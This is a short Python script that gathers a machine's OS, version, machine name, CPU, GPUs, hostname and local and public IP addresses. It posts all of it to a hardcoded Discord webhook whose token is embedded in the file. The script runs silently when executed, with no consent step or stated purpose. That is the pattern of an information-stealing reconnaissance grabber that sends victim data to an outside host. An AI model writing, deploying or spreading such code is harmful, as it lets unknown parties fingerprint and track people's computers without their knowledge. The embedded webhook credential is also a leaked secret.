import platform
import requests
import socket
from cpuinfo import get_cpu_info
import GPUtil

# Replace with your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        return f"Error fetching IP: {e}"

def get_machine_info():
    try:
        cpu_info = get_cpu_info()
        gpu_info = GPUtil.getGPUs()
        
        gpu_details = [
            f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpu_info
        ]
        
        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine Name": platform.node(),
            "CPU": cpu_info.get("brand_raw", "Unknown CPU"),
            "Architecture": platform.architecture()[0],
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "GPUs": "; ".join(gpu_details) if gpu_details else "No GPU Detected",
        }
    except Exception as e:
        return {"Error": f"Failed to retrieve machine info: {e}"}

def send_to_discord(machine_info, public_ip):
    try:
        content = f"**Machine Info:**\n"
        for key, value in machine_info.items():
            content += f"{key}: {value}\n"
        content += f"**Public IP:** {public_ip}"
        payload = {"content": content}
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send to Discord: {e}")

if __name__ == "__main__":
    public_ip = get_public_ip()
    machine_info = get_machine_info()
    send_to_discord(machine_info, public_ip)
